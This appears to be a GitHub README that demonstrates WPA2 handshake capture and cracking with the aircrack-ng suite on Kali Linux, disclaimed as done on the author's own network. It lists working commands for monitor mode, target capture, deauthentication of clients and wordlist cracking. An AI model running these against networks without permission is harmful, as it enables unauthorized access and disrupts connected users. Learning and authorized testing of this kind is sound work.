# 🛠️ WiFi Handshake Capture Demo

This project demonstrates how to capture a WPA2 WiFi handshake using tools from the `aircrack-ng` suite on Kali Linux.

> ⚠️ **Disclaimer:** This demonstration is intended **strictly for educational and ethical testing purposes only**.  
> All actions were performed on a private WiFi network owned by the author.  
> Do **not** use these techniques on any network without **explicit permission** from the owner.  
> Unauthorized access to networks is illegal and punishable by law.

---

## 📸 Steps (with Images)

1. **Stop network services**
   ```bash
   sudo airmon-ng check kill
   ```
   ![](https://github.com/anonx5/wifi-handshake-demo/blob/main/images/kill_services.png)

2. **Enable monitor mode**
   ```bash
   sudo airmon-ng start wlan0
   ```
   ![](https://github.com/anonx5/wifi-handshake-demo/blob/main/images/enable_monitor_mode.png)

3. **Discover Wi-Fi networks**
   ```bash
   sudo airodump-ng wlan0mon
   ```
   ![](https://github.com/anonx5/wifi-handshake-demo/blob/main/images/scan_networks.png)

4. **Capture WPA2 handshake**
   ```bash
   sudo airodump-ng -c [CH] --bssid [BSSID] -w capture wlan0mon
   ```
   ![](https://github.com/anonx5/wifi-handshake-demo/blob/main/images/scan%20target.png)

5. **Disconnect a device (for handshake)**
   ```bash
   sudo aireplay-ng --deauth 5 -a [BSSID] wlan0mon
   ```
   ![](https://github.com/anonx5/wifi-handshake-demo/blob/main/images/send_deauth_packets.png)

6. **Analyze handshake with a wordlist**
   ```bash
   sudo aircrack-ng -w wordlist.txt -b [BSSID] capture.cap
   ```
   ![](https://github.com/anonx5/wifi-handshake-demo/blob/main/images/aircrack_attempt.png)

7. **Result**
   ![](https://github.com/anonx5/wifi-handshake-demo/blob/main/images/cracked_success.png)

---

## 📁 Notes

- Environment: Kali Linux
- This project is strictly for learning and demonstration on your own network.
